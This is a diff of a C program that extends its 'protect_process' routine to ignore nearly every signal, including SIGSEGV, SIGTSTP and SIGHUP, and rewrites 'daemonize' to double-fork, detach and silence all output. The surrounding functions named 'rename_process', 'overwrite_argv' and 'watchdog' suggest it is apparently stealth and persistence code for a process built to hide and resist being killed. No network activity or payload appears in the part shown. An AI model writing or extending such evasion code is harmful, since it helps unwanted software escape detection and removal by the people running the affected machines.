@@ -85,13 +85,13 @@ static void protect_process() {
     sa.sa_handler = SIG_IGN;
     sigfillset(&sa.sa_mask);
     sa.sa_flags = SA_RESTART|SA_NOCLDWAIT;
-    sigaction(SIGTERM, &sa, NULL);
-    sigaction(SIGINT, &sa, NULL);
-    sigaction(SIGQUIT, &sa, NULL);
-    sigaction(SIGPIPE, &sa, NULL);
-    sigaction(SIGUSR1, &sa, NULL);
-    sigaction(SIGUSR2, &sa, NULL);
-    sigaction(SIGCHLD, &sa, NULL);
+    int signals[] = {
+        SIGTERM, SIGINT, SIGQUIT, SIGHUP, SIGTSTP, SIGUSR1, SIGUSR2, SIGALRM, SIGPIPE, SIGCHLD, SIGCONT, SIGABRT, SIGTRAP, SIGBUS, SIGFPE, SIGILL, SIGSEGV, SIGSYS, SIGXCPU, SIGXFSZ, SIGVTALRM, SIGPROF, SIGPWR, SIGURG, SIGWINCH, SIGIO, SIGSTKFLT, SIGTTIN, SIGTTOU
+    };
+    int num_signals = sizeof(signals)/sizeof(signals[0]);
+    for (int i = 0; i < num_signals; i++) {
+        sigaction(signals[i], &sa, NULL);
+    }
 }
 
 void* rename_process(void* arg) {
@@ -327,30 +327,33 @@ void setup_signal_handlers() {
 
 void daemonize(int argc, char** argv) {
     pid_t pid = fork();
-    if(pid < 0) return;
-    if(pid > 0) return;
-    if(setsid() < 0) return;
+    if (pid > 0) _exit(0);
+
+    setsid();
+
     pid = fork();
-    if(pid < 0) return;
-    if(pid > 0) return;
-    if(chdir("/") != 0) return;
+    if (pid > 0) _exit(0);
+
+    int _chdir_ret = chdir("/");
+    (void)_chdir_ret;
     umask(0);
     struct rlimit rlim;
-    if(!getrlimit(RLIMIT_NOFILE,&rlim))
-        for(int i=0;i<rlim.rlim_max;i++) close(i);
-    int fd = open("/dev/null",O_RDWR);
-    if(fd >= 0) {
-        dup2(fd,0);dup2(fd,1);dup2(fd,2);
-        if(fd>2)close(fd);
+    if (!getrlimit(RLIMIT_NOFILE, &rlim)) {
+        for (int i = 0; i < (int)rlim.rlim_max; i++) close(i);
+    }
+    int fd = open("/dev/null", O_RDWR);
+    if (fd >= 0) {
+        dup2(fd, 0); dup2(fd, 1); dup2(fd, 2);
+        if (fd > 2) close(fd);
     }
     protect_process();
     pthread_attr_t attr;
     pthread_attr_init(&attr);
-    pthread_attr_setdetachstate(&attr,PTHREAD_CREATE_DETACHED);
+    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
     pthread_t watcher;
-    pthread_create(&watcher,&attr,watchdog,NULL);
+    pthread_create(&watcher, &attr, watchdog, NULL);
     pthread_attr_destroy(&attr);
-    srand(time(NULL)^(getpid()<<16));
+    srand(time(NULL) ^ (getpid() << 16));
 }
 
 void overwrite_argv(int argc, char** argv) {
